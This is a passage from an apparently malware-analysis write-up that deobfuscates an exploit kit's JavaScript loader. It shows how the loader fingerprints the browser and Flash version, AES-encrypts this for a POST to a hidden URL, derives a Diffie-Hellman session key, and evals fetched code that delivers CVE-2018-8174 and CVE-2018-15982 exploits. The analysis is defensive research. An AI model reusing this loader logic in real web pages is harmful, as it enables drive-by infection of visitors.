<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">II1l1IlI</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">@@</span><span class="dl">'</span> <span class="p">[</span><span class="dl">'</span><span class="s1">II1l1IlI</span><span class="dl">'</span><span class="p">]();</span>
</code></pre></div></div>

<p>Five data have been added to the array <code class="language-plaintext highlighter-rouge">l11IlIIlllll</code>. Other than the last one is the random data created earlier. There are 5 random data, but the data other than str_C is send data. The last one is the browser check data generated earlier. It checks whether the browser is Opera, Firefox, IE or Chrome, respectively, and contains true or false and is concatenated with <code class="language-plaintext highlighter-rouge">@@</code>. Such data is prepared for send. It should be noted here that str_C has not been sent to the server.</p>

<p>Next, let’s look at the sending process.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">I1l1I1</span><span class="dl">'</span><span class="p">](</span><span class="nx">Il1I11l</span><span class="p">,</span> <span class="dl">"</span><span class="s2">post</span><span class="dl">"</span><span class="p">,</span> <span class="nx">l11llIll</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>

<span class="cm">/* -- snip -- */</span>

<span class="c1">// Send POST</span>
<span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1lllIIlI</span><span class="dl">'</span><span class="p">](</span>
    <span class="nx">Il1I11l</span><span class="p">,</span>

    <span class="c1">// aes_encrypt(data, key, iv)</span>
    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lI11lIl</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">Ill1lI1Ill</span><span class="dl">'</span><span class="p">](</span>
        <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">IIII1Il</span><span class="dl">'</span><span class="p">](</span><span class="nx">l11IlIIlllll</span><span class="p">),</span>        <span class="c1">// post request data</span>
        <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">III1l1</span><span class="dl">'</span><span class="p">],</span>                       <span class="c1">// key</span>
        <span class="p">{</span> <span class="na">lI1lIl1Ill</span><span class="p">:</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">II1ll11I</span><span class="dl">'</span><span class="p">]</span> <span class="p">}</span>      <span class="c1">// iv</span>
    <span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">]()</span>
<span class="p">);</span>
</code></pre></div></div>

<p>This is also a general request sending process. The URL is a string decoded by AES earlier. The data to be sent is the previously prepared data, but these are encrypted by AES. The key and IV are the same as those used to decode the URL. The previous data to be encrypted looks like this.</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nl">"lIlII11"</span><span class="p">:</span><span class="s2">"c81e728d9d4c2f636f067f89cc14862c"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"lll1II"</span><span class="p">:</span><span class="s2">"a87ff679a2f3e71d9181a67b7542122c"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"l11IlIl"</span><span class="p">:</span><span class="s2">"3f05415ebff145466040f6a73dca8704"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"lI1lIl1Ill"</span><span class="p">:</span><span class="s2">"c4ca4238a0b923820dcc509a6f75849b"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"II1l1IlI"</span><span class="p">:</span><span class="s2">"false@@false@@true@@false"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>The data actually sent is encrypted in this way.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TvU4TAyld3MNlDcMtLwxBo+uVXAbIB1jpPO1a9HDv2dZs7HonG67s8heWoMyvnUFqFBdoEhU0STYjHHQxX6DK7x7Z1naG/2TAdm+AR5l6gpYVl4jXB9oOOyfJtZrfJHabQT5Jhlqv1dtvsJ+0G27qhamqtPT16wCpXn2R2WHf8NJu9SvXSSVadW7sT6QDt32Jt0z3oR0VIlpuE/w3snfKDNIjJYhuMz/VGYIL9WNdg0hC26sxB5fJ5fOOuifh2rNk9GgNsNdfVP01Tf77GRDu9puTbgfsgYOnCz0ONOmp05B14kJ1tK8ZI6ciOWLvOYV
</code></pre></div></div>

<p>Let’s look at the process after sending. <code class="language-plaintext highlighter-rouge">onreadystatechange</code> is called. Here, two AES decodings are performed. Let’s first look at the first decoding process.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// aes_decrypt(enc_data, key, iv)</span>
<span class="kd">var</span> <span class="nx">lIlIl1IIl11</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lI11lIl</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">l11II11l</span><span class="dl">'</span><span class="p">](</span>
    <span class="nx">Il1I11l</span><span class="p">[</span><span class="dl">'</span><span class="s1">responseText</span><span class="dl">'</span><span class="p">],</span>                <span class="c1">// enc_data</span>
    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">III1l1</span><span class="dl">'</span><span class="p">],</span>                       <span class="c1">// key</span>
    <span class="p">{</span> <span class="na">lI1lIl1Ill</span><span class="p">:</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">II1ll11I</span><span class="dl">'</span><span class="p">]</span> <span class="p">}</span>      <span class="c1">// iv</span>
<span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">IIIlI</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">Il11I1II</span><span class="dl">'</span><span class="p">]);</span>

<span class="kd">var</span> <span class="nx">l1I1l1</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIl11</span><span class="dl">'</span><span class="p">](</span><span class="nx">lIlIl1IIl11</span><span class="p">);</span>
</code></pre></div></div>

<p>POST response data is encrypted with AES. The keys and IV are the same as before, and the hard-coded values (<code class="language-plaintext highlighter-rouge">8b69cbdfc5fe43e69b7920c8ee721fc9</code> and <code class="language-plaintext highlighter-rouge">301ae8205ddcd5897df69e3b0c056c34</code>) are hard-coded in the JavaScript code. Jsonify is performed because the JSON data can be obtained by decoding. The decoded JSON data looks like this.</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nl">"IlI1l"</span><span class="p">:</span><span class="s2">"9b412e5c651d73fd1e271dd63f6901a0"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"I1111"</span><span class="p">:</span><span class="s2">"r+sZGwxURs48PDt8pilYLNYjKbVrMHSmlgv0jeEE7qd8KN+KbbqRpYBUUrEFfM5VSLfRPthHQmyzFoY7fuCtOQQ9vUiMBC+3</span><span class="se">\/</span><span class="s2">pL…"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>Decode the second data using the first (32-character hexadecimal string) of this data. The first data is called str_F. Also, decoding is done with AES, but the key and IV are different from before.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">lIlll1IIlI</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nx">l1I1l1</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlll1IIlI</span><span class="dl">'</span><span class="p">],</span> <span class="mi">16</span><span class="p">);</span>    <span class="c1">// str_F</span>

<span class="c1">// key (str_G) =&gt; str_F.modPow(str_C, str_D)</span>
<span class="kd">var</span> <span class="nx">llIIlI</span> <span class="o">=</span> <span class="nx">lIlll1IIlI</span><span class="p">[</span><span class="dl">'</span><span class="s1">ll11IIl</span><span class="dl">'</span><span class="p">](</span><span class="nx">ll1l1IlIIIll</span><span class="p">,</span> <span class="nx">lll1II</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">I1Il1I1</span> <span class="o">=</span> <span class="nx">llIIlI</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">IIIIlI1IllII</span> <span class="o">=</span> <span class="mi">32</span> <span class="o">-</span> <span class="nx">I1Il1I1</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
<span class="k">while</span> <span class="p">(</span><span class="nx">IIIIlI1IllII</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">I1Il1I1</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">0</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">I1Il1I1</span><span class="p">;</span>
    <span class="nx">IIIIlI1IllII</span><span class="o">--</span><span class="p">;</span>
<span class="p">}</span>
<span class="kd">var</span> <span class="nx">II1ll</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">IIIlI</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1lI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">ll1llI1</span><span class="dl">'</span><span class="p">](</span><span class="nx">I1Il1I1</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">lI1lIl1Ill</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">IIIlI</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1lI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">ll1llI1</span><span class="dl">'</span><span class="p">](</span><span class="nx">l1ll1</span><span class="p">);</span>

<span class="c1">// aes_decrypt(enc_data, key, iv)</span>
<span class="kd">var</span> <span class="nx">Il11lII1</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lI11lIl</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">l11II11l</span><span class="dl">'</span><span class="p">](</span>
    <span class="nx">l1I1l1</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIl1IIl11</span><span class="dl">'</span><span class="p">],</span>          <span class="c1">// enc_data</span>
    <span class="nx">II1ll</span><span class="p">,</span>                          <span class="c1">// str_G</span>
    <span class="p">{</span> <span class="na">lI1lIl1Ill</span><span class="p">:</span> <span class="nx">lI1lIl1Ill</span> <span class="p">}</span>      <span class="c1">// iv =&gt; str_A</span>
<span class="p">);</span>
</code></pre></div></div>

<p>The values generated by str_F, str_C and str_D are called str_G. Thus, str_C is required to decode the data, but str_C has not been sent to the server. By looking at the traffic data, you can see str_E and str_G created by str_C, but it is impossible to find str_C. Please see Wikipedia for details.</p>
<ul>
  <li><a href="https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange">Diffie–Hellman key exchange - Wikipedia</a></li>
</ul>

<p>The data thus decoded is executed as JavsScript.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// eval</span>
<span class="nx">II1Il</span><span class="p">[</span><span class="dl">'</span><span class="s1">ll1I1</span><span class="dl">'</span><span class="p">]();</span>
</code></pre></div></div>

<p>Let’s look at the executed code. First, the URL used next is decoded. The key and IV used at this time are hard-coded initial values.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// aes_decrypt(enc_url, key, iv)</span>
<span class="kd">var</span> <span class="nx">l11l1I1</span> <span class="o">=</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">Il1IIllIlI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">lI11lIl</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">l11II11l</span><span class="dl">"</span><span class="p">](</span>
    <span class="dl">"</span><span class="s2">l9kie2x7t4Iq4hRNA3G3Juz+buSrv9OSyATsAvZRjsoWkjatAa3Am6oRnar5jjv2N8XFpvDYQbKswFbyKiGPXM/eRwj5+hz4hg+dTKr5BLk=</span><span class="dl">"</span><span class="p">,</span>
    <span class="nx">III1l1</span><span class="p">,</span>
    <span class="p">{</span> <span class="na">lI1lIl1Ill</span><span class="p">:</span><span class="nx">II1ll11I</span> <span class="p">}</span>
<span class="p">)[</span><span class="dl">"</span><span class="s2">lIlIlll11l</span><span class="dl">"</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">Il1IIllIlI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">IIIlI</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">Il11I1II</span><span class="dl">"</span><span class="p">]);</span>
</code></pre></div></div>

<p>Then, as before, the function is called. Let’s look at the function. First, define the necessary data for encryption/decryption as before. Give each one a name as before.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// str_A2</span>
<span class="kd">var</span> <span class="nx">l1ll1</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">]();</span>
<span class="c1">// str_B2</span>
<span class="kd">var</span> <span class="nx">lIlII11</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](),</span><span class="mi">16</span><span class="p">);</span>
<span class="c1">// str_C2</span>
<span class="kd">var</span> <span class="nx">ll1l1IlIIIll</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](),</span><span class="mi">16</span><span class="p">);</span>
<span class="c1">// str_D2</span>
<span class="kd">var</span> <span class="nx">lll1II</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](),</span><span class="mi">16</span><span class="p">);</span>

<span class="c1">// str_E2 =&gt; str_B2.powMod(str_C2, str_D2)</span>
<span class="kd">var</span> <span class="nx">l11IlIl</span> <span class="o">=</span> <span class="nx">lIlII11</span><span class="p">[</span><span class="dl">'</span><span class="s1">ll11IIl</span><span class="dl">'</span><span class="p">](</span><span class="nx">ll1l1IlIIIll</span><span class="p">,</span><span class="nx">lll1II</span><span class="p">);</span>
</code></pre></div></div>

<p>Next, prepare the data to send as a POST request. Unlike before, Adobe Flash Player version information is also sent.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">l11IlIIlllll</span> <span class="o">=</span> <span class="p">{};</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlII11</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">lIlII11</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>    <span class="c1">// str_B2</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">lll1II</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">lll1II</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>      <span class="c1">// str_D2</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">l11IlIl</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">l11IlIl</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>    <span class="c1">// str_E2</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">lI1lIl1Ill</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">l1ll1</span><span class="p">;</span>                     <span class="c1">// str_A2</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">II1l1IlI</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">@@</span><span class="dl">'</span><span class="p">[</span><span class="dl">'</span><span class="s1">II1l1IlI</span><span class="dl">'</span><span class="p">]();</span>          <span class="c1">// browser check data</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l111I</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l111I</span><span class="dl">'</span><span class="p">];</span>            <span class="c1">// Adobe Flash Player version check data</span>
</code></pre></div></div>

<p>The sending process is the same as the previous one. The key and IV used in this case are also initial values.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">I1l1I1</span><span class="dl">'</span><span class="p">](</span><span class="nx">Il1I11l</span><span class="p">,</span><span class="dl">"</span><span class="s2">post</span><span class="dl">"</span><span class="p">,</span><span class="nx">l11l1I1</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>

<span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1lllIIlI</span><span class="dl">'</span><span class="p">](</span>
    <span class="nx">Il1I11l</span><span class="p">,</span>
    <span class="c1">// aes_encrypt</span>
    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lI11lIl</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">Ill1lI1Ill</span><span class="dl">'</span><span class="p">](</span>
        <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">IIII1Il</span><span class="dl">'</span><span class="p">](</span><span class="nx">l11IlIIlllll</span><span class="p">),</span>    <span class="c1">// POST Data</span>
        <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">III1l1</span><span class="dl">'</span><span class="p">],</span>                   <span class="c1">// key</span>
        <span class="p">{</span><span class="na">lI1lIl1Ill</span><span class="p">:</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">II1ll11I</span><span class="dl">'</span><span class="p">]}</span>     <span class="c1">// iv</span>
    <span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">]()</span>
<span class="p">);</span>
</code></pre></div></div>

<p>Thus, <code class="language-plaintext highlighter-rouge">onreadystatechange</code> is called as well. Here too, the decoding process is performed as before. First, decode POST response data with the same key and IV as before.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// aes_decrypt(enc_data, key, iv)</span>
<span class="kd">var</span> <span class="nx">lIlIl1IIl11</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lI11lIl</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">l11II11l</span><span class="dl">'</span><span class="p">](</span>
    <span class="nx">Il1I11l</span><span class="p">[</span><span class="dl">'</span><span class="s1">responseText</span><span class="dl">'</span><span class="p">],</span>                <span class="c1">// enc_data</span>
    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">III1l1</span><span class="dl">'</span><span class="p">],</span>                       <span class="c1">// key</span>
    <span class="p">{</span><span class="na">lI1lIl1Ill</span><span class="p">:</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">II1ll11I</span><span class="dl">'</span><span class="p">]}</span>         <span class="c1">// iv</span>
<span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">IIIlI</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">Il11I1II</span><span class="dl">'</span><span class="p">]);</span>
</code></pre></div></div>

<p>When jsonify the decoded result, three data are included like this. The first 32-character hexadecimal string is called str_F2.</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nl">"lIlll1IIlI"</span><span class="p">:</span><span class="w"> </span><span class="s2">"87e087b48d4b06215f486021f23f5470"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"lIIIIllIl1"</span><span class="p">:</span><span class="w"> </span><span class="s2">"oUeRtTwLk9lLYqMwZC3AM49H8HDw15IqymZ0W</span><span class="se">\/</span><span class="s2">vw87Vd9RtdXhps9ZppZc</span><span class="se">\/</span><span class="s2">INO01Bqk79BOMS9ykHCDPE</span><span class="se">\/\/</span><span class="s2">kWCHQuuh0</span><span class="se">\/</span><span class="s2">rr…"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"II11lIl11"</span><span class="p">:</span><span class="w"> </span><span class="s2">"88HY4nkc9TWmnRPi</span><span class="se">\/</span><span class="s2">hEPmk8ZCTJ5tIwItosOTmqFjUBFxCXfoXdMKas+TeKLUbdwsXAhvGa35wNmMnajdPzt1huWerzwnhoGcFP…"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>Decrypt these data. Thus two data are decoded.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">lIlll1IIlI</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nx">l1I1l1</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlll1IIlI</span><span class="dl">'</span><span class="p">],</span><span class="mi">16</span><span class="p">);</span>

<span class="c1">// str_G2 =&gt; str_F2.modPow(str_C2, str_D2)</span>
<span class="kd">var</span> <span class="nx">llIIlI</span> <span class="o">=</span> <span class="nx">lIlll1IIlI</span><span class="p">[</span><span class="dl">'</span><span class="s1">ll11IIl</span><span class="dl">'</span><span class="p">](</span><span class="nx">ll1l1IlIIIll</span><span class="p">,</span><span class="nx">lll1II</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">I1Il1I1</span> <span class="o">=</span> <span class="nx">llIIlI</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">IIIIlI1IllII</span> <span class="o">=</span> <span class="mi">32</span> <span class="o">-</span> <span class="nx">I1Il1I1</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
<span class="k">while</span><span class="p">(</span><span class="nx">IIIIlI1IllII</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">I1Il1I1</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">0</span><span class="dl">'</span><span class="o">+</span><span class="nx">I1Il1I1</span><span class="p">;</span>
    <span class="nx">IIIIlI1IllII</span><span class="o">--</span><span class="p">;</span>
<span class="p">}</span>
<span class="kd">var</span> <span class="nx">II1ll</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">IIIlI</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1lI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">ll1llI1</span><span class="dl">'</span><span class="p">](</span><span class="nx">I1Il1I1</span><span class="p">);</span>       <span class="c1">// str_G2</span>
<span class="kd">var</span> <span class="nx">lI1lIl1Ill</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">IIIlI</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1lI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">ll1llI1</span><span class="dl">'</span><span class="p">](</span><span class="nx">l1ll1</span><span class="p">);</span>    <span class="c1">// str_A2</span>

<span class="c1">// aes_decrypt()</span>
<span class="kd">var</span> <span class="nx">I1II111I1</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lI11lIl</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">l11II11l</span><span class="dl">'</span><span class="p">](</span>
    <span class="nx">l1I1l1</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIIIIllIl1</span><span class="dl">'</span><span class="p">],</span>       <span class="c1">// enc_data_1</span>
    <span class="nx">II1ll</span><span class="p">,</span>                      <span class="c1">// str_G2</span>
    <span class="p">{</span><span class="na">lI1lIl1Ill</span><span class="p">:</span> <span class="nx">lI1lIl1Ill</span><span class="p">}</span>    <span class="c1">// str_A2</span>
<span class="p">);</span>

<span class="kd">var</span> <span class="nx">IIIIl</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lI11lIl</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">l11II11l</span><span class="dl">'</span><span class="p">](</span>
    <span class="nx">l1I1l1</span><span class="p">[</span><span class="dl">'</span><span class="s1">II11lIl11</span><span class="dl">'</span><span class="p">],</span>        <span class="c1">// enc_data_2</span>
    <span class="nx">II1ll</span><span class="p">,</span>                      <span class="c1">// str_G2</span>
    <span class="p">{</span><span class="na">lI1lIl1Ill</span><span class="p">:</span> <span class="nx">lI1lIl1Ill</span><span class="p">}</span>    <span class="c1">// str_A2</span>
<span class="p">);</span>
</code></pre></div></div>

<p>The data thus decoded is written to Body and executed. The decoded data is the CVE-2018-8174 exploit code and the CVE-2018-15982 exploit code for reading swf loader.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="nx">IlIII1lll</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">]</span> <span class="o">!==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
